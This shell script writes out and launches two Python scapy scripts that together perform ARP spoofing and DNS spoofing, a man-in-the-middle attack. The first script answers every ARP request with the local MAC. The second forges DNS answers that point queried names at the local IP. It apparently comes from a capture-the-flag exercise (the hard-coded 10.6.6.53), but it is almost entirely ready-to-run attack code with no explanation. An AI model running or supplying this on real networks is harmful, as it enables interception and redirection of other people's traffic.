cat << 'EOF' > arp_resp.py
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
  # if arp request, then we need to fill this out to send back our mac as the response
  if ARP in packet and packet[ARP].op == 1:
    # config_values = get_config_values()
    ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)

    arp_response = ARP(pdst=macaddr)
    arp_response.op = 2
    arp_response.plen = 4
    arp_response.hwlen = 6
    arp_response.ptype = 0x800
    arp_response.hwtype = 0x1

    arp_response.hwsrc = macaddr
    arp_response.hwdst = packet[Ether].hwsrc

    arp_response.psrc = packet[Ether].pdst
    arp_response.pdst = packet[Ether].psrc

    response = ether_resp/arp_response

    sendp(response, iface="eth0")

def main():
  # We only want arp requests
  berkeley_packet_filter = "(arp[6:2] = 1)"
  # sniffing for one packet that will be sent to a function, while storing none
  while True:
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
  main()

EOF

cat << 'EOF' > dns_resp.py
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.6.53"
def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    eth = Ether(src=macaddr, dst=packet[Ether].src)   # need to replace mac addresses
    ip  = IP(dst=packet[IP].src, src=ipaddr_we_arp_spoofed)                          # need to replace IP addresses
    udp = UDP(dport=packet[IP].sport, sport=53)                             # need to replace ports
    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an = DNSRR(rrname=packet[DNS].qd.qname, ttl=300, rdata=ipaddr))
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")
    print('Sent DNS response')
def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )
    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    while True:
      sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
if __name__ == "__main__":
    main()

EOF
chmod 750 ./dns_resp.py
nohup ./dns_resp.py &

chmod 750 ./arp_resp.py
nohup ./arp_resp.py &
